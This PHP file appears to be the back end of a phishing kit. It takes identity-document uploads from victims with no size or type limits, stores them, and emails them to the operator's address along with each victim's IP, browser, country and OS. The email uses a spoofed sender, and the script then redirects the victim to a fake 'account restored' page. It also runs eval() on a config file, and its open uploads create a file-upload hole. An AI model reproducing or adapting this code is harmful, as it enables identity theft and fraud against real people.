<?php
require_once __DIR__ . '/../include/fileuploader/autoload.php';
require_once __DIR__ . '/../function.php';
require_once __DIR__ . '/../filter.php';

if (file_exists('../config/' . $api->general_config)) {
  @eval(file_get_contents('../config/' . $api->general_config));
}

$FileUploader = new FileUploader('files', array(
    'limit' => null,
    'maxSize' => null,
    'fileMaxSize' => null,
    'extensions' => null,
    'required' => false,
    'uploadDir' => '../admin/uploads/',
    'title' => 'name',
    'replace' => false,
    'editor' => array(
        'maxWidth' => 640,
        'maxHeight' => 480,
        'quality' => 90
    ),
    'listInput' => true,
    'files' => null
));

foreach ($FileUploader->getRemovedFiles('file') as $key => $value) {
  unlink('../admin/uploads/' . $value['name']);
}

$data = $FileUploader->upload();

if ($data['isSuccess'] && count($data['files']) > 0) {
    $uploadedFiles = $data['files'];
}

if ($data['hasWarnings']) {
    $warnings = $data['warnings'];
}

$message = file_get_contents('../assets/html/identity.html');
$message = preg_replace('{QUOTE}', $quotes[array_rand($quotes, 1)], $message);

$message = preg_replace('{KUZULUY-IP}', $_SESSION['ip'], $message);
$message = preg_replace('{KUZULUY-AGENT}', $_SESSION['agent'], $message);

$subject  = "Identity Submitted [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." ]";
  $headers  = "From: ID-Card <dxdiag@goodpostman.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

if ($config_smtp == 1){
  $api->ngesend($api->result(), $subject, $message);
} else {
  mail($api->result(), $subject, $message, $headers);
}

$api->redirect("../myaccount/restored");

?>
